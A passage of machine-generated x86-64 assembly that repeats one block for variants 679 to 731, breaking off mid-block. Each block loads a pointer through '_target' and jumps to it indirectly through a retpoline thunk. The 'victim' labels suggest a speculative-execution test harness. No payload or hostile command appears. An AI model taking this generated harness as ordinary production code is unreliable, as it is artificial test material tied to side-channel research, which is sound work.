.Lgg_retpol_after_000678:
	jmp	.Lvictim_win0_continue
## Variant 679
.Lvictim_win0_var679:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000679
	jmp	.Lgg_retpol_after_000679
.Lgg_retpol_thunk_000679:
	callq	.Lgg_retpol_setup_000679
.Lgg_retpol_cap_000679:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000679
.Lgg_retpol_setup_000679:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000679:
	jmp	.Lvictim_win0_continue
## Variant 680
.Lvictim_win0_var680:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000680
	jmp	.Lgg_retpol_after_000680
.Lgg_retpol_thunk_000680:
	callq	.Lgg_retpol_setup_000680
.Lgg_retpol_cap_000680:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000680
.Lgg_retpol_setup_000680:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000680:
	jmp	.Lvictim_win0_continue
## Variant 681
.Lvictim_win0_var681:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000681
	jmp	.Lgg_retpol_after_000681
.Lgg_retpol_thunk_000681:
	callq	.Lgg_retpol_setup_000681
.Lgg_retpol_cap_000681:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000681
.Lgg_retpol_setup_000681:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000681:
	jmp	.Lvictim_win0_continue
## Variant 682
.Lvictim_win0_var682:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000682
	jmp	.Lgg_retpol_after_000682
.Lgg_retpol_thunk_000682:
	callq	.Lgg_retpol_setup_000682
.Lgg_retpol_cap_000682:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000682
.Lgg_retpol_setup_000682:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000682:
	jmp	.Lvictim_win0_continue
## Variant 683
.Lvictim_win0_var683:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000683
	jmp	.Lgg_retpol_after_000683
.Lgg_retpol_thunk_000683:
	callq	.Lgg_retpol_setup_000683
.Lgg_retpol_cap_000683:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000683
.Lgg_retpol_setup_000683:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000683:
	jmp	.Lvictim_win0_continue
## Variant 684
.Lvictim_win0_var684:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000684
	jmp	.Lgg_retpol_after_000684
.Lgg_retpol_thunk_000684:
	callq	.Lgg_retpol_setup_000684
.Lgg_retpol_cap_000684:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000684
.Lgg_retpol_setup_000684:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000684:
	jmp	.Lvictim_win0_continue
## Variant 685
.Lvictim_win0_var685:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000685
	jmp	.Lgg_retpol_after_000685
.Lgg_retpol_thunk_000685:
	callq	.Lgg_retpol_setup_000685
.Lgg_retpol_cap_000685:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000685
.Lgg_retpol_setup_000685:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000685:
	jmp	.Lvictim_win0_continue
## Variant 686
.Lvictim_win0_var686:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000686
	jmp	.Lgg_retpol_after_000686
.Lgg_retpol_thunk_000686:
	callq	.Lgg_retpol_setup_000686
.Lgg_retpol_cap_000686:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000686
.Lgg_retpol_setup_000686:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000686:
	jmp	.Lvictim_win0_continue
## Variant 687
.Lvictim_win0_var687:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000687
	jmp	.Lgg_retpol_after_000687
.Lgg_retpol_thunk_000687:
	callq	.Lgg_retpol_setup_000687
.Lgg_retpol_cap_000687:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000687
.Lgg_retpol_setup_000687:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000687:
	jmp	.Lvictim_win0_continue
## Variant 688
.Lvictim_win0_var688:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000688
	jmp	.Lgg_retpol_after_000688
.Lgg_retpol_thunk_000688:
	callq	.Lgg_retpol_setup_000688
.Lgg_retpol_cap_000688:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000688
.Lgg_retpol_setup_000688:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000688:
	jmp	.Lvictim_win0_continue
## Variant 689
.Lvictim_win0_var689:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000689
	jmp	.Lgg_retpol_after_000689
.Lgg_retpol_thunk_000689:
	callq	.Lgg_retpol_setup_000689
.Lgg_retpol_cap_000689:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000689
.Lgg_retpol_setup_000689:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000689:
	jmp	.Lvictim_win0_continue
## Variant 690
.Lvictim_win0_var690:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000690
	jmp	.Lgg_retpol_after_000690
.Lgg_retpol_thunk_000690:
	callq	.Lgg_retpol_setup_000690
.Lgg_retpol_cap_000690:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000690
.Lgg_retpol_setup_000690:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000690:
	jmp	.Lvictim_win0_continue
## Variant 691
.Lvictim_win0_var691:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000691
	jmp	.Lgg_retpol_after_000691
.Lgg_retpol_thunk_000691:
	callq	.Lgg_retpol_setup_000691
.Lgg_retpol_cap_000691:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000691
.Lgg_retpol_setup_000691:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000691:
	jmp	.Lvictim_win0_continue
## Variant 692
.Lvictim_win0_var692:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000692
	jmp	.Lgg_retpol_after_000692
.Lgg_retpol_thunk_000692:
	callq	.Lgg_retpol_setup_000692
.Lgg_retpol_cap_000692:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000692
.Lgg_retpol_setup_000692:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000692:
	jmp	.Lvictim_win0_continue
## Variant 693
.Lvictim_win0_var693:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000693
	jmp	.Lgg_retpol_after_000693
.Lgg_retpol_thunk_000693:
	callq	.Lgg_retpol_setup_000693
.Lgg_retpol_cap_000693:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000693
.Lgg_retpol_setup_000693:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000693:
	jmp	.Lvictim_win0_continue
## Variant 694
.Lvictim_win0_var694:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000694
	jmp	.Lgg_retpol_after_000694
.Lgg_retpol_thunk_000694:
	callq	.Lgg_retpol_setup_000694
.Lgg_retpol_cap_000694:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000694
.Lgg_retpol_setup_000694:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000694:
	jmp	.Lvictim_win0_continue
## Variant 695
.Lvictim_win0_var695:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000695
	jmp	.Lgg_retpol_after_000695
.Lgg_retpol_thunk_000695:
	callq	.Lgg_retpol_setup_000695
.Lgg_retpol_cap_000695:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000695
.Lgg_retpol_setup_000695:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000695:
	jmp	.Lvictim_win0_continue
## Variant 696
.Lvictim_win0_var696:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000696
	jmp	.Lgg_retpol_after_000696
.Lgg_retpol_thunk_000696:
	callq	.Lgg_retpol_setup_000696
.Lgg_retpol_cap_000696:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000696
.Lgg_retpol_setup_000696:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000696:
	jmp	.Lvictim_win0_continue
## Variant 697
.Lvictim_win0_var697:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000697
	jmp	.Lgg_retpol_after_000697
.Lgg_retpol_thunk_000697:
	callq	.Lgg_retpol_setup_000697
.Lgg_retpol_cap_000697:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000697
.Lgg_retpol_setup_000697:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000697:
	jmp	.Lvictim_win0_continue
## Variant 698
.Lvictim_win0_var698:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000698
	jmp	.Lgg_retpol_after_000698
.Lgg_retpol_thunk_000698:
	callq	.Lgg_retpol_setup_000698
.Lgg_retpol_cap_000698:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000698
.Lgg_retpol_setup_000698:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000698:
	jmp	.Lvictim_win0_continue
## Variant 699
.Lvictim_win0_var699:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000699
	jmp	.Lgg_retpol_after_000699
.Lgg_retpol_thunk_000699:
	callq	.Lgg_retpol_setup_000699
.Lgg_retpol_cap_000699:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000699
.Lgg_retpol_setup_000699:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000699:
	jmp	.Lvictim_win0_continue
## Variant 700
.Lvictim_win0_var700:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000700
	jmp	.Lgg_retpol_after_000700
.Lgg_retpol_thunk_000700:
	callq	.Lgg_retpol_setup_000700
.Lgg_retpol_cap_000700:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000700
.Lgg_retpol_setup_000700:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000700:
	jmp	.Lvictim_win0_continue
## Variant 701
.Lvictim_win0_var701:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000701
	jmp	.Lgg_retpol_after_000701
.Lgg_retpol_thunk_000701:
	callq	.Lgg_retpol_setup_000701
.Lgg_retpol_cap_000701:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000701
.Lgg_retpol_setup_000701:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000701:
	jmp	.Lvictim_win0_continue
## Variant 702
.Lvictim_win0_var702:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000702
	jmp	.Lgg_retpol_after_000702
.Lgg_retpol_thunk_000702:
	callq	.Lgg_retpol_setup_000702
.Lgg_retpol_cap_000702:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000702
.Lgg_retpol_setup_000702:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000702:
	jmp	.Lvictim_win0_continue
## Variant 703
.Lvictim_win0_var703:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000703
	jmp	.Lgg_retpol_after_000703
.Lgg_retpol_thunk_000703:
	callq	.Lgg_retpol_setup_000703
.Lgg_retpol_cap_000703:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000703
.Lgg_retpol_setup_000703:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000703:
	jmp	.Lvictim_win0_continue
## Variant 704
.Lvictim_win0_var704:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000704
	jmp	.Lgg_retpol_after_000704
.Lgg_retpol_thunk_000704:
	callq	.Lgg_retpol_setup_000704
.Lgg_retpol_cap_000704:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000704
.Lgg_retpol_setup_000704:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000704:
	jmp	.Lvictim_win0_continue
## Variant 705
.Lvictim_win0_var705:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000705
	jmp	.Lgg_retpol_after_000705
.Lgg_retpol_thunk_000705:
	callq	.Lgg_retpol_setup_000705
.Lgg_retpol_cap_000705:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000705
.Lgg_retpol_setup_000705:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000705:
	jmp	.Lvictim_win0_continue
## Variant 706
.Lvictim_win0_var706:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000706
	jmp	.Lgg_retpol_after_000706
.Lgg_retpol_thunk_000706:
	callq	.Lgg_retpol_setup_000706
.Lgg_retpol_cap_000706:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000706
.Lgg_retpol_setup_000706:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000706:
	jmp	.Lvictim_win0_continue
## Variant 707
.Lvictim_win0_var707:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000707
	jmp	.Lgg_retpol_after_000707
.Lgg_retpol_thunk_000707:
	callq	.Lgg_retpol_setup_000707
.Lgg_retpol_cap_000707:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000707
.Lgg_retpol_setup_000707:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000707:
	jmp	.Lvictim_win0_continue
## Variant 708
.Lvictim_win0_var708:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000708
	jmp	.Lgg_retpol_after_000708
.Lgg_retpol_thunk_000708:
	callq	.Lgg_retpol_setup_000708
.Lgg_retpol_cap_000708:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000708
.Lgg_retpol_setup_000708:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000708:
	jmp	.Lvictim_win0_continue
## Variant 709
.Lvictim_win0_var709:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000709
	jmp	.Lgg_retpol_after_000709
.Lgg_retpol_thunk_000709:
	callq	.Lgg_retpol_setup_000709
.Lgg_retpol_cap_000709:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000709
.Lgg_retpol_setup_000709:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000709:
	jmp	.Lvictim_win0_continue
## Variant 710
.Lvictim_win0_var710:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000710
	jmp	.Lgg_retpol_after_000710
.Lgg_retpol_thunk_000710:
	callq	.Lgg_retpol_setup_000710
.Lgg_retpol_cap_000710:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000710
.Lgg_retpol_setup_000710:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000710:
	jmp	.Lvictim_win0_continue
## Variant 711
.Lvictim_win0_var711:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000711
	jmp	.Lgg_retpol_after_000711
.Lgg_retpol_thunk_000711:
	callq	.Lgg_retpol_setup_000711
.Lgg_retpol_cap_000711:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000711
.Lgg_retpol_setup_000711:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000711:
	jmp	.Lvictim_win0_continue
## Variant 712
.Lvictim_win0_var712:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000712
	jmp	.Lgg_retpol_after_000712
.Lgg_retpol_thunk_000712:
	callq	.Lgg_retpol_setup_000712
.Lgg_retpol_cap_000712:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000712
.Lgg_retpol_setup_000712:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000712:
	jmp	.Lvictim_win0_continue
## Variant 713
.Lvictim_win0_var713:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000713
	jmp	.Lgg_retpol_after_000713
.Lgg_retpol_thunk_000713:
	callq	.Lgg_retpol_setup_000713
.Lgg_retpol_cap_000713:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000713
.Lgg_retpol_setup_000713:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000713:
	jmp	.Lvictim_win0_continue
## Variant 714
.Lvictim_win0_var714:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000714
	jmp	.Lgg_retpol_after_000714
.Lgg_retpol_thunk_000714:
	callq	.Lgg_retpol_setup_000714
.Lgg_retpol_cap_000714:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000714
.Lgg_retpol_setup_000714:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000714:
	jmp	.Lvictim_win0_continue
## Variant 715
.Lvictim_win0_var715:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000715
	jmp	.Lgg_retpol_after_000715
.Lgg_retpol_thunk_000715:
	callq	.Lgg_retpol_setup_000715
.Lgg_retpol_cap_000715:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000715
.Lgg_retpol_setup_000715:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000715:
	jmp	.Lvictim_win0_continue
## Variant 716
.Lvictim_win0_var716:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000716
	jmp	.Lgg_retpol_after_000716
.Lgg_retpol_thunk_000716:
	callq	.Lgg_retpol_setup_000716
.Lgg_retpol_cap_000716:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000716
.Lgg_retpol_setup_000716:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000716:
	jmp	.Lvictim_win0_continue
## Variant 717
.Lvictim_win0_var717:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000717
	jmp	.Lgg_retpol_after_000717
.Lgg_retpol_thunk_000717:
	callq	.Lgg_retpol_setup_000717
.Lgg_retpol_cap_000717:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000717
.Lgg_retpol_setup_000717:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000717:
	jmp	.Lvictim_win0_continue
## Variant 718
.Lvictim_win0_var718:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000718
	jmp	.Lgg_retpol_after_000718
.Lgg_retpol_thunk_000718:
	callq	.Lgg_retpol_setup_000718
.Lgg_retpol_cap_000718:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000718
.Lgg_retpol_setup_000718:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000718:
	jmp	.Lvictim_win0_continue
## Variant 719
.Lvictim_win0_var719:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000719
	jmp	.Lgg_retpol_after_000719
.Lgg_retpol_thunk_000719:
	callq	.Lgg_retpol_setup_000719
.Lgg_retpol_cap_000719:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000719
.Lgg_retpol_setup_000719:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000719:
	jmp	.Lvictim_win0_continue
## Variant 720
.Lvictim_win0_var720:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000720
	jmp	.Lgg_retpol_after_000720
.Lgg_retpol_thunk_000720:
	callq	.Lgg_retpol_setup_000720
.Lgg_retpol_cap_000720:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000720
.Lgg_retpol_setup_000720:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000720:
	jmp	.Lvictim_win0_continue
## Variant 721
.Lvictim_win0_var721:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000721
	jmp	.Lgg_retpol_after_000721
.Lgg_retpol_thunk_000721:
	callq	.Lgg_retpol_setup_000721
.Lgg_retpol_cap_000721:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000721
.Lgg_retpol_setup_000721:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000721:
	jmp	.Lvictim_win0_continue
## Variant 722
.Lvictim_win0_var722:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000722
	jmp	.Lgg_retpol_after_000722
.Lgg_retpol_thunk_000722:
	callq	.Lgg_retpol_setup_000722
.Lgg_retpol_cap_000722:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000722
.Lgg_retpol_setup_000722:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000722:
	jmp	.Lvictim_win0_continue
## Variant 723
.Lvictim_win0_var723:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000723
	jmp	.Lgg_retpol_after_000723
.Lgg_retpol_thunk_000723:
	callq	.Lgg_retpol_setup_000723
.Lgg_retpol_cap_000723:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000723
.Lgg_retpol_setup_000723:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000723:
	jmp	.Lvictim_win0_continue
## Variant 724
.Lvictim_win0_var724:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000724
	jmp	.Lgg_retpol_after_000724
.Lgg_retpol_thunk_000724:
	callq	.Lgg_retpol_setup_000724
.Lgg_retpol_cap_000724:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000724
.Lgg_retpol_setup_000724:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000724:
	jmp	.Lvictim_win0_continue
## Variant 725
.Lvictim_win0_var725:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000725
	jmp	.Lgg_retpol_after_000725
.Lgg_retpol_thunk_000725:
	callq	.Lgg_retpol_setup_000725
.Lgg_retpol_cap_000725:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000725
.Lgg_retpol_setup_000725:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000725:
	jmp	.Lvictim_win0_continue
## Variant 726
.Lvictim_win0_var726:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000726
	jmp	.Lgg_retpol_after_000726
.Lgg_retpol_thunk_000726:
	callq	.Lgg_retpol_setup_000726
.Lgg_retpol_cap_000726:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000726
.Lgg_retpol_setup_000726:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000726:
	jmp	.Lvictim_win0_continue
## Variant 727
.Lvictim_win0_var727:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000727
	jmp	.Lgg_retpol_after_000727
.Lgg_retpol_thunk_000727:
	callq	.Lgg_retpol_setup_000727
.Lgg_retpol_cap_000727:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000727
.Lgg_retpol_setup_000727:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000727:
	jmp	.Lvictim_win0_continue
## Variant 728
.Lvictim_win0_var728:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000728
	jmp	.Lgg_retpol_after_000728
.Lgg_retpol_thunk_000728:
	callq	.Lgg_retpol_setup_000728
.Lgg_retpol_cap_000728:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000728
.Lgg_retpol_setup_000728:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000728:
	jmp	.Lvictim_win0_continue
## Variant 729
.Lvictim_win0_var729:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000729
	jmp	.Lgg_retpol_after_000729
.Lgg_retpol_thunk_000729:
	callq	.Lgg_retpol_setup_000729
.Lgg_retpol_cap_000729:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000729
.Lgg_retpol_setup_000729:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000729:
	jmp	.Lvictim_win0_continue
## Variant 730
.Lvictim_win0_var730:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000730
	jmp	.Lgg_retpol_after_000730
.Lgg_retpol_thunk_000730:
	callq	.Lgg_retpol_setup_000730
.Lgg_retpol_cap_000730:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000730
.Lgg_retpol_setup_000730:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000730:
	jmp	.Lvictim_win0_continue
## Variant 731
.Lvictim_win0_var731:
	popq	%rax
